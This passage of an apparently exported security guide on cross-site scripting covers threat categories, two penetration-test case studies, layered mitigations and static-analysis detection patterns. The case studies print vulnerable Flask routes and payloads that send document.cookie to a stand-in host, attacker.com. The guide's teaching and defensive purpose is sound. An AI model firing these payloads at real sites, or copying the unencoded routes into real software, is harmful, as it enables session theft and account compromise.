class="bulleted-list"><li style="list-style-type:disc">Output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8072-b423-cd03c89b7244" class="bulleted-list"><li style="list-style-type:disc">CSP</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8023-a094-fc8fffdc993d" class="bulleted-list"><li style="list-style-type:disc">Input validation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8004-a606-c34e74797865" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bd-b905-f83a8681ae96"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8007-b47f-e426c375de1d" class=""><strong>Repudiation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8042-bb7e-e2285602088a" class=""><strong>Threat:</strong> Actions performed via XSS cannot be attributed.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-807a-8536-df26eb3cf26c" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c9-ba92-ed5a7cfd2d10" class="bulleted-list"><li style="list-style-type:disc">Actions appear to come from victim</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e3-97ec-cce025f73b28" class="bulleted-list"><li style="list-style-type:disc">No audit trail</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801e-b431-f51683fd8741" class="bulleted-list"><li style="list-style-type:disc">Difficult to investigate</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806e-af29-e848190ccfce" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809e-84b4-fa88cc365821" class="bulleted-list"><li style="list-style-type:disc">Comprehensive logging</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803d-ac62-e2dd5b714174" class="bulleted-list"><li style="list-style-type:disc">Request correlation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807e-a027-f08bae8917da" class="bulleted-list"><li style="list-style-type:disc">User activity monitoring</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8065-ba46-d82dc4fed777" class=""><strong>Risk Rating:</strong> Medium</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807e-89b4-fb5e17bae7f8"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8026-a705-d7c68307a1eb" class=""><strong>Information Disclosure</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ad-90d7-e57d3c891190" class=""><strong>Threat:</strong> Attacker accesses sensitive information via XSS.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cd-9211-e361c89117b0" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807f-9e2b-cd8b68a71d01" class="bulleted-list"><li style="list-style-type:disc">Cookie theft</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8078-b68b-e823650fbad1" class="bulleted-list"><li style="list-style-type:disc">LocalStorage access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f3-a6f4-d30dad95ae13" class="bulleted-list"><li style="list-style-type:disc">Page content extraction</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e9-904d-ff70bd520b8a" class="bulleted-list"><li style="list-style-type:disc">CSRF token theft</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c6-ad7a-c008e70f8dc8" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ca-8b07-ec8540a211ee" class="bulleted-list"><li style="list-style-type:disc">HttpOnly cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f6-8e38-dc499aa87717" class="bulleted-list"><li style="list-style-type:disc">Output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8055-98b6-cc7bb0b689d8" class="bulleted-list"><li style="list-style-type:disc">CSP</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804f-b686-e324b6316565" class="bulleted-list"><li style="list-style-type:disc">Secure cookie attributes</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c2-93d9-ea147464ce01" class=""><strong>Risk Rating:</strong> Critical</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80d5-b686-dbeb0f1c51bc"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-808e-8151-ceaf90e0b3e0" class=""><strong>Denial of Service</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8081-a048-f60a2d79a693" class=""><strong>Threat:</strong> Attacker causes service disruption via XSS.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8064-86cf-e100fc72f094" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805b-a6e2-c6cd07c8694d" class="bulleted-list"><li style="list-style-type:disc">Resource exhaustion</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8022-b197-fcce5fa7e881" class="bulleted-list"><li style="list-style-type:disc">Redirect loops</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8055-bdbb-dbadf296c35c" class="bulleted-list"><li style="list-style-type:disc">DOM manipulation causing crashes</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8064-ae41-c4d51528b4f7" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c4-8880-e3842880af62" class="bulleted-list"><li style="list-style-type:disc">Output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e0-98a1-ec6c67cafe01" class="bulleted-list"><li style="list-style-type:disc">CSP</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803d-ae94-d29e18253ddb" class="bulleted-list"><li style="list-style-type:disc">Rate limiting</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b0-8d8d-e5254fad1f63" class=""><strong>Risk Rating:</strong> Medium</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8009-89e7-c8f20191c9f1"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8070-8cc6-c98a655c023d" class=""><strong>Elevation of Privilege</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a9-ad94-d1e47381effd" class=""><strong>Threat:</strong> Attacker gains elevated privileges via XSS.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-807e-81fe-e842f34606a3" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8091-b526-eaf0cc59c2ab" class="bulleted-list"><li style="list-style-type:disc">Session hijacking (admin sessions)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a4-a275-cbfb3002fd98" class="bulleted-list"><li style="list-style-type:disc">CSRF token theft</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fb-9b76-ee338c0ba3ee" class="bulleted-list"><li style="list-style-type:disc">API key extraction</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804d-a734-dd51c57ca507" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d8-933f-e6327918a6da" class="bulleted-list"><li style="list-style-type:disc">HttpOnly cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807f-9047-f56d3822e6aa" class="bulleted-list"><li style="list-style-type:disc">Output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805a-b2b8-d8ff0ab0ac56" class="bulleted-list"><li style="list-style-type:disc">CSP</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8003-92c5-fd6df0445a56" class="bulleted-list"><li style="list-style-type:disc">Token protection</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c0-b0e2-c28688d5dc00" class=""><strong>Risk Rating:</strong> Critical</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80f2-8ee0-d607be0b22fc"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80dc-b1cb-f415c3a8441e" class=""><strong>Real-World Case Studies</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8009-9484-c1dc96bac047" class=""><strong>Case Study 1: Stored XSS in Comment System</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e0-a95a-f597b758789a" class=""><strong>Background:</strong> During penetration test, discovered stored XSS in blog comment system.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f1-bc33-dd88c3834a6f" class=""><strong>Discovery:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-805b-bb99-f82c2cf1e549" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+@app.route(&#x27;/comment&#x27;, methods=[&#x27;POST&#x27;])
+def add_comment():
+    comment = request.form[&#x27;comment&#x27;]
+    # No encoding!
+    db.comments.insert({&#x27;comment&#x27;: comment})
+    return &quot;Comment added&quot;
+
+@app.route(&#x27;/blog/&lt;post_id&gt;&#x27;)
+def show_post(post_id):
+    post = db.posts.find_one({&#x27;_id&#x27;: post_id})
+    comments = db.comments.find({&#x27;post_id&#x27;: post_id})
+    # Display without encoding
+    return render_template(&#x27;post.html&#x27;, post=post, comments=comments)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8025-8931-cec68f9fb106" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809e-98b5-db954013bf95" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Attacker&#x27;s comment --&gt;
+&lt;script&gt;
+  fetch(&#x27;http://attacker.com/steal?cookie=&#x27; + document.cookie);
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8064-bf6f-c1d496bcd00e" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d9-9b64-d6c24fbc1656" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - Session cookies stolen</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8009-b45c-e53b54b1d077" class="bulleted-list"><li style="list-style-type:disc"><strong>Integrity</strong>: High - Could modify comments/content</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b0-a72c-ec8d75323b46" class="bulleted-list"><li style="list-style-type:disc"><strong>Availability</strong>: Medium - Potential DoS</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8088-a33b-d012b5912d64" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: Critical - User account compromise</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800e-8c5d-fdd5edc50b94" class=""><strong>Root Cause:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807b-b9a1-cafeb08b9cfe" class="bulleted-list"><li style="list-style-type:disc">No output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f4-9137-c31d8958acf7" class="bulleted-list"><li style="list-style-type:disc">No input validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808d-9bb7-db675cdc8f92" class="bulleted-list"><li style="list-style-type:disc">No CSP</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b6-b29d-fd1ffa95edae" class="bulleted-list"><li style="list-style-type:disc">Comments stored as-is</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8073-84ab-fbcc094e9d5f" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8038-84b0-edf4a4da4d1b" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+@app.route(&#x27;/comment&#x27;, methods=[&#x27;POST&#x27;])
+def add_comment():
+    comment = request.form[&#x27;comment&#x27;]
+    # Validate and sanitize input
+    comment = sanitize_html(comment)
+    db.comments.insert({&#x27;comment&#x27;: comment})
+    return &quot;Comment added&quot;
+
+@app.route(&#x27;/blog/&lt;post_id&gt;&#x27;)
+def show_post(post_id):
+    post = db.posts.find_one({&#x27;_id&#x27;: post_id})
+    comments = db.comments.find({&#x27;post_id&#x27;: post_id})
+    # Encode on output
+    safe_comments = [escape(c[&#x27;comment&#x27;]) for c in comments]
+    return render_template(&#x27;post.html&#x27;, post=post, comments=safe_comments)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8011-8ca4-c62dbec0f396"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8004-a258-e9025bb04a43" class=""><strong>Case Study 2: Reflected XSS in Search Functionality</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8059-aeb8-d00272e98d5c" class=""><strong>Background:</strong> Security assessment revealed reflected XSS in search feature.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8019-96f9-c5916cee4c2f" class=""><strong>Discovery:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8039-869f-fd72bd8ceb30" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+@app.route(&#x27;/search&#x27;)
+def search():
+    query = request.args.get(&#x27;q&#x27;)
+    # Directly reflected without encoding
+    return f&quot;&lt;h1&gt;Search results for: {query}&lt;/h1&gt;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8009-bc37-f4f8ab9b0f98" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8037-b570-f48dbc7a52f5" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: /search?q=&lt;script&gt;document.location=&#x27;http://attacker.com/phish?cookie=&#x27;+document.cookie&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8065-824c-f07d8a14f22d" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8097-be6a-d816324f5be2" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - Session hijacking</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f0-9112-efaf4fa281d0" class="bulleted-list"><li style="list-style-type:disc"><strong>Integrity</strong>: High - Phishing attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8089-8f21-dbc776d37d5f" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: Critical - Account compromise, reputation damage</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8017-aa1b-e89b04a9558b" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-803e-94b3-ef4c5d0cee71" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+@app.route(&#x27;/search&#x27;)
+def search():
+    query = request.args.get(&#x27;q&#x27;)
+    # Encode output
+    safe_query = escape(query)
+    return f&quot;&lt;h1&gt;Search results for: {safe_query}&lt;/h1&gt;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8002-a65c-c48e0b3e6eff"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80c8-a691-ca018bc83f93" class=""><strong>Advanced Mitigations</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8085-b2c2-c4538d534889" class=""><strong>Defense in Depth Strategy</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d0-9282-f9317cb92f76" class=""><strong>Layer 1: Output Encoding</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b4-98c4-f6ee5d613d89" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+# HTML context
+safe_output = escape(user_input)
+
+# JavaScript context
+safe_output = json.dumps(user_input)
+
+# URL context
+safe_output = quote(user_input)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d5-a860-d2f6939d1498" class=""><strong>Layer 2: Content Security Policy</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8074-a993-d9cc4c83020e" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">response.headers[&#x27;Content-Security-Policy&#x27;] = (
+    &quot;default-src &#x27;self&#x27;; &quot;
+    &quot;script-src &#x27;self&#x27;; &quot;
+    &quot;style-src &#x27;self&#x27;; &quot;
+    &quot;img-src &#x27;self&#x27; https:; &quot;
+    &quot;connect-src &#x27;self&#x27;; &quot;
+    &quot;frame-ancestors &#x27;none&#x27;&quot;
+)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806d-addd-cfc8a9f181bd" class=""><strong>Layer 3: HttpOnly Cookies</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8013-b941-f7d07ab53b2f" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">response.set_cookie(
+    &#x27;sessionId&#x27;,
+    value=session_id,
+    httponly=True,
+    secure=True,
+    samesite=&#x27;Strict&#x27;
+)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ad-81fb-c1df44ff2169" class=""><strong>Layer 4: Input Validation</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80dc-958e-d96a549784db" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">def validate_input(input_value):
+    # Whitelist approach
+    if not re.match(r&#x27;^[a-zA-Z0-9\s.,!?-]+$&#x27;, input_value):
+        raise ValueError(&quot;Invalid input&quot;)
+    return input_value
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fc-adb5-efd96b4b704f" class=""><strong>Layer 5: Framework Auto-Escaping</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8075-8d02-d29339b73696" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Use templating engine with auto-escaping
+return render_template(&#x27;template.html&#x27;, user_input=user_input)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80d8-9eee-c9cb1860d3f0"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8053-bdae-ec4490cbbb16" class=""><strong>SAST/DAST Detection</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8087-8078-c90b748a241f" class=""><strong>SAST (Static Application Security Testing)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8014-aa58-c5f19654f431" class=""><strong>Vulnerable Code Patterns:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804e-95b1-f544cd93b566" class=""><strong>1. Direct String Concatenation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8039-86da-ce6e969dbd66" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+return f&quot;&lt;h1&gt;{user_input}&lt;/h1&gt;&quot;
+
+# SAST Detection:
+# - Pattern: String concatenation with user input in HTML
+# - Severity: High
+# - CWE: CWE-79 (Cross-site Scripting)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b9-b4ad-ce78190d3605" class=""><strong>2. innerHTML Usage:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8073-8efd-c9d232d9ad7b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ VULNERABLE
+element.innerHTML = userInput;
+
+// SAST Detection:
+# - Pattern: innerHTML assignment with user input
+# - Severity: High
+# - CWE: CWE-79
